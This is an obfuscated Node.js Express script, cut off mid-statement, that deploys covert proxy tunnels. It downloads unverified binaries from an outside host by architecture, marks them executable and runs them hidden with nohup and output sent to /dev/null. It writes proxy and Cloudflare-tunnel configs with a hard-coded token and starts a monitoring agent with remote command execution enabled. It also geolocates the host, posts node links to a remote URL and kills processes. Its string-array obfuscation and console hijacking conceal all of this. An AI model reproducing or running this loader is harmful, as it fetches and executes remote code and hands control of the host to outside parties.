const _0x9baf07=_0x2651;(function(_0x3cb127,_0x4eeb5b){const _0x22da49=_0x2651,_0x988fd4=_0x3cb127();while(!![]){try{const _0x34a42e=-parseInt(_0x22da49(0x135))/0x1*(parseInt(_0x22da49(0x175))/0x2)+parseInt(_0x22da49(0x151))/0x3*(parseInt(_0x22da49(0x150))/0x4)+-parseInt(_0x22da49(0x1d8))/0x5*(-parseInt(_0x22da49(0x14e))/0x6)+parseInt(_0x22da49(0x166))/0x7*(parseInt(_0x22da49(0x194))/0x8)+parseInt(_0x22da49(0x11b))/0x9+-parseInt(_0x22da49(0x185))/0xa*(parseInt(_0x22da49(0x183))/0xb)+-parseInt(_0x22da49(0x155))/0xc*(parseInt(_0x22da49(0x115))/0xd);if(_0x34a42e===_0x4eeb5b)break;else _0x988fd4['push'](_0x988fd4['shift']());}catch(_0x4743d2){_0x988fd4['push'](_0x988fd4['shift']());}}}(_0x326d,0xf010d));const _0x260c6d=(function(){let _0x139596=!![];return function(_0x181835,_0xd0dfe6){const _0x32e952=_0x139596?function(){const _0x29548a=_0x2651;if(_0xd0dfe6){const _0xec31b7=_0xd0dfe6[_0x29548a(0x15f)](_0x181835,arguments);return _0xd0dfe6=null,_0xec31b7;}}:function(){};return _0x139596=![],_0x32e952;};}()),_0x54890d=_0x260c6d(this,function(){const _0x2909a0=_0x2651;return _0x54890d[_0x2909a0(0x13c)]()['search'](_0x2909a0(0x147))[_0x2909a0(0x13c)]()['constructor'](_0x54890d)[_0x2909a0(0x19b)](_0x2909a0(0x147));});_0x54890d();const _0x2235e0=(function(){let _0x5fac76=!![];return function(_0x5e6a6a,_0x24d55f){const _0x26416f=_0x5fac76?function(){if(_0x24d55f){const _0x13673a=_0x24d55f['apply'](_0x5e6a6a,arguments);return _0x24d55f=null,_0x13673a;}}:function(){};return _0x5fac76=![],_0x26416f;};}()),_0x10056b=_0x2235e0(this,function(){const _0x4501a1=_0x2651,_0x399937=function(){const _0x103619=_0x2651;let _0x4cb47b;try{_0x4cb47b=Function(_0x103619(0x11c)+_0x103619(0x1b7)+');')();}catch(_0x44eab8){_0x4cb47b=window;}return _0x4cb47b;},_0x5c5fb7=_0x399937(),_0x5469a0=_0x5c5fb7['console']=_0x5c5fb7[_0x4501a1(0x1cc)]||{},_0x5a85ed=[_0x4501a1(0x1af),'warn',_0x4501a1(0x1c9),_0x4501a1(0x108),_0x4501a1(0x134),_0x4501a1(0x1b3),_0x4501a1(0x192)];for(let _0x2f614c=0x0;_0x2f614c<_0x5a85ed[_0x4501a1(0x160)];_0x2f614c++){const _0x1eccb7=_0x2235e0[_0x4501a1(0x131)][_0x4501a1(0x164)][_0x4501a1(0x197)](_0x2235e0),_0x4e570a=_0x5a85ed[_0x2f614c],_0x4952cd=_0x5469a0[_0x4e570a]||_0x1eccb7;_0x1eccb7[_0x4501a1(0x12a)]=_0x2235e0[_0x4501a1(0x197)](_0x2235e0),_0x1eccb7[_0x4501a1(0x13c)]=_0x4952cd[_0x4501a1(0x13c)]['bind'](_0x4952cd),_0x5469a0[_0x4e570a]=_0x1eccb7;}});_0x10056b();const express=require(_0x9baf07(0x1a3)),app=express(),axios=require(_0x9baf07(0x179)),os=require('os'),fs=require('fs'),path=require(_0x9baf07(0x168)),{promisify}=require(_0x9baf07(0x1a9)),exec=promisify(require(_0x9baf07(0x1ba))['exec']),UPLOAD_URL=process[_0x9baf07(0x129)]['UPLOAD_URL']||'',PROJECT_URL=process['env'][_0x9baf07(0x18b)]||'',AUTO_ACCESS=process[_0x9baf07(0x129)][_0x9baf07(0x114)]||![],FILE_PATH=process[_0x9baf07(0x129)][_0x9baf07(0x137)]||_0x9baf07(0x199),SUB_PATH=process[_0x9baf07(0x129)][_0x9baf07(0x123)]||'susbaka',PORT=process['env'][_0x9baf07(0x156)]||process[_0x9baf07(0x129)][_0x9baf07(0x1cb)]||0xbb8,UUID=process[_0x9baf07(0x129)][_0x9baf07(0x16b)]||_0x9baf07(0x101),NEZHA_SERVER=process[_0x9baf07(0x129)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x9baf07(0x129)][_0x9baf07(0x113)]||'',NEZHA_KEY=process[_0x9baf07(0x129)][_0x9baf07(0x1c8)]||'',ARGO_DOMAIN=process[_0x9baf07(0x129)][_0x9baf07(0x105)]||_0x9baf07(0x159),ARGO_AUTH=process['env'][_0x9baf07(0x15c)]||_0x9baf07(0x1bb),ARGO_PORT=process[_0x9baf07(0x129)]['ARGO_PORT']||0x70e3,CFIP=process[_0x9baf07(0x129)][_0x9baf07(0x174)]||_0x9baf07(0x1d9),CFPORT=process[_0x9baf07(0x129)][_0x9baf07(0x1a6)]||0x1bb,NAME=process[_0x9baf07(0x129)][_0x9baf07(0x17a)]||_0x9baf07(0x10e);!fs[_0x9baf07(0x14f)](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console[_0x9baf07(0x1af)](FILE_PATH+_0x9baf07(0x184))):console[_0x9baf07(0x1af)](FILE_PATH+_0x9baf07(0x14c));function generateRandomName(){const _0x701cff=_0x9baf07,_0x4b4465=_0x701cff(0x139);let _0x2ba62a='';for(let _0x1f6d13=0x0;_0x1f6d13<0x6;_0x1f6d13++){_0x2ba62a+=_0x4b4465[_0x701cff(0x133)](Math[_0x701cff(0x188)](Math[_0x701cff(0x17c)]()*_0x4b4465['length']));}return _0x2ba62a;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x9baf07(0x165)](FILE_PATH,npmName),phpPath=path[_0x9baf07(0x165)](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path[_0x9baf07(0x165)](FILE_PATH,_0x9baf07(0x132)),listPath=path[_0x9baf07(0x165)](FILE_PATH,_0x9baf07(0x1a1)),bootLogPath=path['join'](FILE_PATH,_0x9baf07(0x15e)),configPath=path[_0x9baf07(0x165)](FILE_PATH,_0x9baf07(0x126));function deleteNodes(){const _0x26c15a=_0x9baf07;try{if(!UPLOAD_URL)return;if(!fs[_0x26c15a(0x14f)](subPath))return;let _0xd1a88e;try{_0xd1a88e=fs[_0x26c15a(0x193)](subPath,'utf-8');}catch{return null;}const _0x21555a=Buffer[_0x26c15a(0x18c)](_0xd1a88e,_0x26c15a(0x14d))[_0x26c15a(0x13c)](_0x26c15a(0x14b)),_0x13d944=_0x21555a[_0x26c15a(0x191)]('\x0a')[_0x26c15a(0x138)](_0x155591=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x26c15a(0x15a)](_0x155591));if(_0x13d944[_0x26c15a(0x160)]===0x0)return;return axios[_0x26c15a(0x12c)](UPLOAD_URL+_0x26c15a(0x19d),JSON['stringify']({'nodes':_0x13d944}),{'headers':{'Content-Type':_0x26c15a(0x187)}})[_0x26c15a(0x148)](_0x13d9c3=>{return null;}),null;}catch(_0x232920){return null;}}function cleanupOldFiles(){try{const _0x228a80=fs['readdirSync'](FILE_PATH);_0x228a80['forEach'](_0x292160=>{const _0x32ddec=_0x2651,_0x3ed7d3=path[_0x32ddec(0x165)](FILE_PATH,_0x292160);try{const _0x3f7e63=fs['statSync'](_0x3ed7d3);_0x3f7e63[_0x32ddec(0x10a)]()&&fs[_0x32ddec(0x10c)](_0x3ed7d3);}catch(_0x403522){}});}catch(_0x401fb4){}}async function generateConfig(){const _0x493fcc=_0x9baf07,_0x3b7c8a={'log':{'access':_0x493fcc(0xfd),'error':'/dev/null','loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':_0x493fcc(0x13a),'settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':_0x493fcc(0x1c4),'dest':0xbba},{'path':_0x493fcc(0x1cd),'dest':0xbbb},{'path':_0x493fcc(0x119),'dest':0xbbc}]},'streamSettings':{'network':_0x493fcc(0x143)}},{'port':0xbb9,'listen':_0x493fcc(0x12f),'protocol':_0x493fcc(0x13a),'settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':'tcp','security':_0x493fcc(0x13b)}},{'port':0xbba,'listen':_0x493fcc(0x12f),'protocol':'vless','settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x493fcc(0x13b),'wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':['http','tls',_0x493fcc(0x142)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x493fcc(0x12f),'protocol':_0x493fcc(0x178),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x493fcc(0x1cd)}},'sniffing':{'enabled':!![],'destOverride':[_0x493fcc(0x1c7),'tls',_0x493fcc(0x142)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x493fcc(0x12f),'protocol':_0x493fcc(0x12d),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x493fcc(0x119)}},'sniffing':{'enabled':!![],'destOverride':[_0x493fcc(0x1c7),'tls',_0x493fcc(0x142)],'metadataOnly':![]}}],'dns':{'servers':[_0x493fcc(0x1db)]},'outbounds':[{'protocol':_0x493fcc(0x12e),'tag':_0x493fcc(0x15b)},{'protocol':_0x493fcc(0x158),'tag':_0x493fcc(0x130)}]};fs[_0x493fcc(0x176)](path[_0x493fcc(0x165)](FILE_PATH,_0x493fcc(0x126)),JSON[_0x493fcc(0x141)](_0x3b7c8a,null,0x2));}function getSystemArchitecture(){const _0x1b4c98=_0x9baf07,_0x5f0fe1=os['arch']();return _0x5f0fe1===_0x1b4c98(0x167)||_0x5f0fe1===_0x1b4c98(0x196)||_0x5f0fe1===_0x1b4c98(0x145)?'arm':_0x1b4c98(0x1d4);}function downloadFile(_0x4467e1,_0x492b00,_0x5dbafc){const _0x2161f4=_0x9baf07,_0x51a0fa=_0x4467e1;!fs[_0x2161f4(0x14f)](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x40be74=fs[_0x2161f4(0x1b0)](_0x51a0fa);axios({'method':_0x2161f4(0x106),'url':_0x492b00,'responseType':'stream'})[_0x2161f4(0x117)](_0x1e7193=>{const _0x4a1d4e=_0x2161f4;_0x1e7193[_0x4a1d4e(0x186)][_0x4a1d4e(0x198)](_0x40be74),_0x40be74['on'](_0x4a1d4e(0x1bc),()=>{const _0x2d9377=_0x4a1d4e;_0x40be74[_0x2d9377(0x181)](),console[_0x2d9377(0x1af)](_0x2d9377(0x13e)+path[_0x2d9377(0x19f)](_0x51a0fa)+_0x2d9377(0x1c1)),_0x5dbafc(null,_0x51a0fa);}),_0x40be74['on'](_0x4a1d4e(0x108),_0x5dc19f=>{const _0x9e4c11=_0x4a1d4e;fs[_0x9e4c11(0x149)](_0x51a0fa,()=>{});const _0xbbde6b=_0x9e4c11(0x13e)+path[_0x9e4c11(0x19f)](_0x51a0fa)+_0x9e4c11(0x19e)+_0x5dc19f[_0x9e4c11(0x1bf)];console[_0x9e4c11(0x108)](_0xbbde6b),_0x5dbafc(_0xbbde6b);});})['catch'](_0xcec5ff=>{const _0x1b190d=_0x2161f4,_0x1a11f7=_0x1b190d(0x13e)+path[_0x1b190d(0x19f)](_0x51a0fa)+_0x1b190d(0x19e)+_0xcec5ff['message'];console['error'](_0x1a11f7),_0x5dbafc(_0x1a11f7);});}async function downloadFilesAndRun(){const _0x5b06a7=_0x9baf07,_0x3ec715=getSystemArchitecture(),_0x387ae8=getFilesForArchitecture(_0x3ec715);if(_0x387ae8[_0x5b06a7(0x160)]===0x0){console[_0x5b06a7(0x1af)](_0x5b06a7(0x13d));return;}const _0x3e8f36=_0x387ae8[_0x5b06a7(0x11e)](_0x32479c=>{return new Promise((_0x4f5f8f,_0x5677ea)=>{downloadFile(_0x32479c['fileName'],_0x32479c['fileUrl'],(_0x4bcf50,_0x1b0973)=>{_0x4bcf50?_0x5677ea(_0x4bcf50):_0x4f5f8f(_0x1b0973);});});});try{await Promise[_0x5b06a7(0x1b5)](_0x3e8f36);}catch(_0x34c425){console[_0x5b06a7(0x108)]('Error\x20downloading\x20files:',_0x34c425);return;}function _0x2e1618(_0x1d750d){const _0x13271c=0x1fd;_0x1d750d['forEach'](_0x111147=>{const _0x42b975=_0x2651;fs[_0x42b975(0x14f)](_0x111147)&&fs[_0x42b975(0x10f)](_0x111147,_0x13271c,_0x39b7c6=>{const _0x5ab5b4=_0x42b975;_0x39b7c6?console['error'](_0x5ab5b4(0x162)+_0x111147+':\x20'+_0x39b7c6):console[_0x5ab5b4(0x1af)](_0x5ab5b4(0x1c6)+_0x111147+':\x20'+_0x13271c['toString'](0x8));});});}const _0x2d0a2b=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x2e1618(_0x2d0a2b);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x3ef9fb=NEZHA_SERVER[_0x5b06a7(0x170)](':')?NEZHA_SERVER[_0x5b06a7(0x191)](':')['pop']():'',_0x9bb16d=new Set([_0x5b06a7(0x1bd),_0x5b06a7(0x177),'2096',_0x5b06a7(0x1c0),'2083','2053']),_0x5e3a27=_0x9bb16d[_0x5b06a7(0x109)](_0x3ef9fb)?'true':_0x5b06a7(0x112),_0x17e7dc='\x0aclient_secret:\x20'+NEZHA_KEY+_0x5b06a7(0x19a)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x5e3a27+_0x5b06a7(0x11d)+UUID;fs[_0x5b06a7(0x176)](path[_0x5b06a7(0x165)](FILE_PATH,_0x5b06a7(0x12b)),_0x17e7dc);const _0x32dcb4='nohup\x20'+phpPath+_0x5b06a7(0x1d3)+FILE_PATH+_0x5b06a7(0x1be);try{await exec(_0x32dcb4),console[_0x5b06a7(0x1af)](phpName+_0x5b06a7(0x116)),await new Promise(_0x212bf2=>setTimeout(_0x212bf2,0x3e8));}catch(_0x5deaf2){console[_0x5b06a7(0x108)](_0x5b06a7(0x146)+_0x5deaf2);}}else{let _0x1800c1='';const _0x20eebb=[_0x5b06a7(0x1bd),_0x5b06a7(0x177),_0x5b06a7(0x182),_0x5b06a7(0x1c0),_0x5b06a7(0x100),_0x5b06a7(0x1d1)];_0x20eebb['includes'](NEZHA_PORT)&&(_0x1800c1=_0x5b06a7(0x16f));const _0x2f5ac4=_0x5b06a7(0x1ce)+npmPath+_0x5b06a7(0x18a)+NEZHA_SERVER+':'+NEZHA_PORT+_0x5b06a7(0x1b4)+NEZHA_KEY+'\x20'+_0x1800c1+_0x5b06a7(0x144);try{await exec(_0x2f5ac4),console[_0x5b06a7(0x1af)](npmName+'\x20is\x20running'),await new Promise(_0x51ebe7=>setTimeout(_0x51ebe7,0x3e8));}catch(_0x13b04b){console[_0x5b06a7(0x108)](_0x5b06a7(0x1a4)+_0x13b04b);}}}else console['log'](_0x5b06a7(0x1ab));const _0x2749c1=_0x5b06a7(0x1ce)+webPath+_0x5b06a7(0x16c)+FILE_PATH+_0x5b06a7(0x1da);try{await exec(_0x2749c1),console[_0x5b06a7(0x1af)](webName+_0x5b06a7(0x116)),await new Promise(_0x571593=>setTimeout(_0x571593,0x3e8));}catch(_0x5cb88d){console[_0x5b06a7(0x108)](_0x5b06a7(0x11f)+_0x5cb88d);}if(fs['existsSync'](botPath)){let _0x367ef6;if(ARGO_AUTH[_0x5b06a7(0x172)](/^[A-Z0-9a-z=]{120,250}$/))_0x367ef6=_0x5b06a7(0x16e)+ARGO_AUTH;else ARGO_AUTH[_0x5b06a7(0x172)](/TunnelSecret/)?_0x367ef6=_0x5b06a7(0x1d7)+FILE_PATH+_0x5b06a7(0x163):_0x367ef6=_0x5b06a7(0x1b6)+FILE_PATH+_0x5b06a7(0x14a)+ARGO_PORT;try{await exec(_0x5b06a7(0x1ce)+botPath+'\x20'+_0x367ef6+'\x20>/dev/null\x202>&1\x20&'),console['log'](botName+'\x20is\x20running'),await new Promise(_0x485637=>setTimeout(_0x485637,0x7d0));}catch(_0xe37789){console[_0x5b06a7(0x108)]('Error\x20executing\x20command:\x20'+_0xe37789);}}await new Promise(_0x2ed5c=>setTimeout(_0x2ed5c,0x1388));}function getFilesForArchitecture(_0x31e888){const _0x3fa9f2=_0x9baf07;let _0x35715d;_0x31e888==='arm'?_0x35715d=[{'fileName':webPath,'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x3fa9f2(0x153)}]:_0x35715d=[{'fileName':webPath,'fileUrl':_0x3fa9f2(0x161)},{'fileName':botPath,'fileUrl':_0x3fa9f2(0x118)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x37650e=_0x31e888===_0x3fa9f2(0x167)?_0x3fa9f2(0x104):'https://amd64.ssss.nyc.mn/agent';_0x35715d['unshift']({'fileName':npmPath,'fileUrl':_0x37650e});}else{const _0xdfd597=_0x31e888===_0x3fa9f2(0x167)?_0x3fa9f2(0x136):_0x3fa9f2(0x1d0);_0x35715d[_0x3fa9f2(0x190)]({'fileName':phpPath,'fileUrl':_0xdfd597});}}return _0x35715d;}function argoType(){const _0xb6a2c1=_0x9baf07;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0xb6a2c1(0x1af)](_0xb6a2c1(0x19c));return;}if(ARGO_AUTH['includes'](_0xb6a2c1(0x16d))){fs[_0xb6a2c1(0x176)](path[_0xb6a2c1(0x165)](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x3f9aea=_0xb6a2c1(0x16a)+ARGO_AUTH[_0xb6a2c1(0x191)]('\x22')[0xb]+_0xb6a2c1(0x154)+path[_0xb6a2c1(0x165)](FILE_PATH,'tunnel.json')+_0xb6a2c1(0x173)+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs['writeFileSync'](path['join'](FILE_PATH,_0xb6a2c1(0x125)),_0x3f9aea);}else console[_0xb6a2c1(0x1af)](_0xb6a2c1(0x189));}function _0x2651(_0x107108,_0x284bfb){_0x107108=_0x107108-0xfd;const _0x4557e4=_0x326d();let _0x10056b=_0x4557e4[_0x107108];return _0x10056b;}async function extractDomains(){const _0x2808b7=_0x9baf07;let _0x3fe5fe;if(ARGO_AUTH&&ARGO_DOMAIN)_0x3fe5fe=ARGO_DOMAIN,console[_0x2808b7(0x1af)](_0x2808b7(0x1ae),_0x3fe5fe),await _0x5bd1e8(_0x3fe5fe);else try{const _0x4ea98f=fs[_0x2808b7(0x193)](path['join'](FILE_PATH,_0x2808b7(0x15e)),_0x2808b7(0x14b)),_0x48eabb=_0x4ea98f[_0x2808b7(0x191)]('\x0a'),_0x2de1cf=[];_0x48eabb['forEach'](_0x30667a=>{const _0x918265=_0x2808b7,_0xcb4ad5=_0x30667a['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0xcb4ad5){const _0x5933f1=_0xcb4ad5[0x1];_0x2de1cf[_0x918265(0x157)](_0x5933f1);}});if(_0x2de1cf[_0x2808b7(0x160)]>0x0)_0x3fe5fe=_0x2de1cf[0x0],console[_0x2808b7(0x1af)](_0x2808b7(0x10b),_0x3fe5fe),await _0x5bd1e8(_0x3fe5fe);else{console[_0x2808b7(0x1af)](_0x2808b7(0x1b9)),fs[_0x2808b7(0x10c)](path['join'](FILE_PATH,_0x2808b7(0x15e)));async function _0x111524(){const _0x4757f0=_0x2808b7;try{process['platform']===_0x4757f0(0x103)?await exec(_0x4757f0(0x128)+botName+_0x4757f0(0x1c5)):await exec(_0x4757f0(0x122)+botName['charAt'](0x0)+']'+botName[_0x4757f0(0x102)](0x1)+_0x4757f0(0x18d));}catch(_0x5a9154){}}_0x111524(),await new Promise(_0x1f5be1=>setTimeout(_0x1f5be1,0xbb8));const _0x56231b=_0x2808b7(0x1b6)+FILE_PATH+_0x2808b7(0x14a)+ARGO_PORT;try{await exec(_0x2808b7(0x1ce)+botPath+'\x20'+_0x56231b+_0x2808b7(0x111)),console['log'](botName+_0x2808b7(0x116)),await new Promise(_0x308bfa=>setTimeout(_0x308bfa,0xbb8)),await extractDomains();}catch(_0x22c3da){console[_0x2808b7(0x108)](_0x2808b7(0x17e)+_0x22c3da);}}}catch(_0x4c67a2){console[_0x2808b7(0x108)](_0x2808b7(0x17d),_0x4c67a2);}async function _0x2f6469(){const _0x4aa12d=_0x2808b7;try{const _0x536d82=await axios[_0x4aa12d(0x106)](_0x4aa12d(0x1c3),{'timeout':0xbb8});if(_0x536d82[_0x4aa12d(0x186)]&&_0x536d82[_0x4aa12d(0x186)][_0x4aa12d(0x1a8)]&&_0x536d82[_0x4aa12d(0x186)][_0x4aa12d(0x1b1)])return _0x536d82[_0x4aa12d(0x186)][_0x4aa12d(0x1a8)]+'_'+_0x536d82[_0x4aa12d(0x186)]['org'];}catch(_0x20aec7){try{const _0x138447=await axios['get'](_0x4aa12d(0x140),{'timeout':0xbb8});if(_0x138447[_0x4aa12d(0x186)]&&_0x138447[_0x4aa12d(0x186)][_0x4aa12d(0x1a2)]===_0x4aa12d(0x1cf)&&_0x138447['data']['countryCode']&&_0x138447[_0x4aa12d(0x186)][_0x4aa12d(0x1b1)])return _0x138447[_0x4aa12d(0x186)][_0x4aa12d(0x120)]+'_'+_0x138447['data'][_0x4aa12d(0x1b1)];}catch(_0x56ffca){}}return _0x4aa12d(0x171);}async function _0x5bd1e8(_0xca42f){const _0x455529=await _0x2f6469(),_0x52830f=NAME?NAME+'-'+_0x455529:_0x455529;return new Promise(_0xd30f72=>{setTimeout(()=>{const _0x507549=_0x2651,_0x4313a7={'v':'2','ps':''+_0x52830f,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':'none','host':_0xca42f,'path':_0x507549(0x18f),'tls':_0x507549(0x18e),'sni':_0xca42f,'alpn':'','fp':_0x507549(0x1a0)},_0x4cc675=_0x507549(0x1d5)+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0xca42f+_0x507549(0x169)+_0xca42f+_0x507549(0x13f)+_0x52830f+_0x507549(0x10d)+Buffer['from'](JSON[_0x507549(0x141)](_0x4313a7))[_0x507549(0x13c)](_0x507549(0x14d))+'\x0a\x0atrojan://'+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0xca42f+_0x507549(0x169)+_0xca42f+'&path=%2Ftrojan-argo%3Fed%3D2560#'+_0x52830f+'\x0a\x20\x20\x20\x20';console[_0x507549(0x1af)](Buffer['from'](_0x4cc675)[_0x507549(0x13c)](_0x507549(0x14d))),fs['writeFileSync'](subPath,Buffer[_0x507549(0x18c)](_0x4cc675)['toString']('base64')),console[_0x507549(0x1af)](FILE_PATH+_0x507549(0x1b2)),uploadNodes(),app[_0x507549(0x106)]('/'+SUB_PATH,(_0x54939d,_0x4b75d0)=>{const _0x1300b4=_0x507549,_0x44223c=Buffer[_0x1300b4(0x18c)](_0x4cc675)[_0x1300b4(0x13c)]('base64');_0x4b75d0[_0x1300b4(0x195)](_0x1300b4(0x1a7),_0x1300b4(0x17f)),_0x4b75d0['send'](_0x44223c);}),_0xd30f72(_0x4cc675);},0x7d0);});}}function _0x326d(){const _0x42c197=['false','NEZHA_PORT','AUTO_ACCESS','10893129aYEQzk','\x20is\x20running','then','https://amd64.ssss.nyc.mn/bot','/trojan-argo','App\x20is\x20running','8279982wnZSSN','return\x20(function()\x20','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','map','web\x20running\x20error:\x20','countryCode','Error\x20in\x20startserver:','pkill\x20-f\x20\x22[','SUB_PATH','response','tunnel.yml','config.json','Subscription\x20uploaded\x20successfully','taskkill\x20/f\x20/im\x20','env','__proto__','config.yaml','post','trojan','freedom','127.0.0.1','block','constructor','sub.txt','charAt','exception','35oqZkxD','https://arm64.ssss.nyc.mn/v1','FILE_PATH','filter','abcdefghijklmnopqrstuvwxyz','vless','none','toString','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','Download\x20','&path=%2Fvless-argo%3Fed%3D2560#','http://ip-api.com/json','stringify','quic','tcp','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','aarch64','php\x20running\x20error:\x20','(((.+)+)+)+$','catch','unlink','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','utf-8','\x20already\x20exists','base64','5125290SLJOkU','existsSync','1220rIPOjb','10581mZuScR','Unhandled\x20error\x20in\x20startserver:','https://arm64.ssss.nyc.mn/bot','\x0a\x20\x20credentials-file:\x20','12RaExrD','SERVER_PORT','push','blackhole','dl2.1195119.xyz','test','direct','ARGO_AUTH','Add\x20automatic\x20access\x20task\x20faild:\x20','boot.log','apply','length','https://amd64.ssss.nyc.mn/web','Empowerment\x20failed\x20for\x20','/tunnel.yml\x20run','prototype','join','1566572WeEhcH','arm','path','&fp=firefox&type=ws&host=','\x0a\x20\x20tunnel:\x20','UUID','\x20-c\x20','TunnelSecret','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','--tls','includes','Unknown','match','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','CFIP','78446LKFfLo','writeFileSync','8443','vmess','axios','NAME','\x20>\x20nul\x202>&1','random','Error\x20reading\x20boot.log:','Error\x20executing\x20command:\x20','text/plain;\x20charset=utf-8','automatic\x20access\x20task\x20added\x20successfully','close','2096','1624568XspXsl','\x20is\x20created','80KrfpgC','data','application/json','floor','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','\x20-s\x20','PROJECT_URL','from','\x22\x20>\x20/dev/null\x202>&1','tls','/vmess-argo?ed=2560','unshift','split','trace','readFileSync','24frTvad','set','arm64','bind','pipe','.tmp','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','search','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','/api/delete-nodes','\x20failed:\x20','basename','firefox','list.txt','status','express','npm\x20running\x20error:\x20','promises','CFPORT','Content-Type','country_code','util','listen','NEZHA\x20variable\x20is\x20empty,skip\x20running','index.html','send','ARGO_DOMAIN:','log','createWriteStream','org','/sub.txt\x20saved\x20successfully','table','\x20-p\x20','all','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','{}.constructor(\x22return\x20this\x22)(\x20)','https://oooo.serv00.net/add-url','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','child_process','eyJhIjoiNTdlODUyN2Y0ZGFlYmJmY2VjMjBmZmY5ZDY1Zjg3ZjQiLCJ0IjoiMTIzNmU4ZDktZDU2MS00NjE4LWFmYjAtYjVjMDQ3MDJmYTljIiwicyI6Ik1EUXhZbUUxWkRVdE4yWXpPUzAwWVROaUxXRTJOVE10TmprNVpXRmlZelJqT1dNeCJ9','finish','443','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','message','2087','\x20successfully','clear','https://ipapi.co/json','/vless-argo','.exe\x20>\x20nul\x202>&1','Empowerment\x20success\x20for\x20','http','NEZHA_KEY','info','/api/add-nodes','PORT','console','/vmess-argo','nohup\x20','success','https://amd64.ssss.nyc.mn/v1','2053','Nodes\x20uploaded\x20successfully','\x20-c\x20\x22','amd','\x0avless://','\x20>/dev/null\x202>&1','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','10OaGKnq','cdns.doon.eu.org','/config.json\x20>/dev/null\x202>&1\x20&','https+local://8.8.8.8/dns-query','/dev/null','Skipping\x20adding\x20automatic\x20access\x20task','Service\x20is\x20runing!<br><br>You\x20can\x20visit\x20/{SUB_PATH}(Default:\x20/sub)\x20get\x20your\x20nodes!','2083','85ef732d-e4b0-4654-b262-7d95532dd0b4','substring','win32','https://arm64.ssss.nyc.mn/agent','ARGO_DOMAIN','get','/api/add-subscriptions','error','has','isFile','ArgoDomain:','unlinkSync','\x0a\x0avmess://','susbaka','chmod','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','\x20>/dev/null\x202>&1\x20&'];_0x326d=function(){return _0x42c197;};return _0x326d();}async function uploadNodes(){const _0x402cc9=_0x9baf07;if(UPLOAD_URL&&PROJECT_URL){const _0x4b8346=PROJECT_URL+'/'+SUB_PATH,_0x164290={'subscription':[_0x4b8346]};try{const _0x13fbf1=await axios['post'](UPLOAD_URL+_0x402cc9(0x107),_0x164290,{'headers':{'Content-Type':_0x402cc9(0x187)}});return _0x13fbf1&&_0x13fbf1['status']===0xc8?(console['log'](_0x402cc9(0x127)),_0x13fbf1):null;}catch(_0x181033){if(_0x181033[_0x402cc9(0x124)]){if(_0x181033['response'][_0x402cc9(0x1a2)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const 